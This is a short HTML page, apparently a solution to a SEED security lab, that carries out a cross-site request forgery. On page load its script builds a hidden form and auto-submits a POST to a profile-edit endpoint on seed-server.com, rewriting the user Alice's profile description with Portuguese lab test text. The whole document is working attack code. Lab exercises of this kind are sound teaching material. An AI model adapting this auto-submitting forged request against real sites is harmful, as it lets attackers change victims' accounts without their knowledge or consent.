<!DOCTYPE html>
<html lang="en">
<body>
<h1>This page forges an HTTP POST request.</h1>
<script>
function forge_post() {
    var fields = "";
    fields += "<input type='hidden' name='name' value='Alice'>";
    fields += "<input type='hidden' name='briefdescription' value='TESTE CSRF POST - LABORATORIO'>";
    fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
    fields += "<input type='hidden' name='guid' value='ID_FICTICIO_OCULTO'>";
    var p = document.createElement("form");
    p.action = "http://www.seed-server.com/action/profile/edit";
    p.method = "POST";
    p.innerHTML = fields;
    document.body.appendChild(p);
    p.submit();
}
window.addEventListener("load", forge_post);
</script>
</body>
</html>
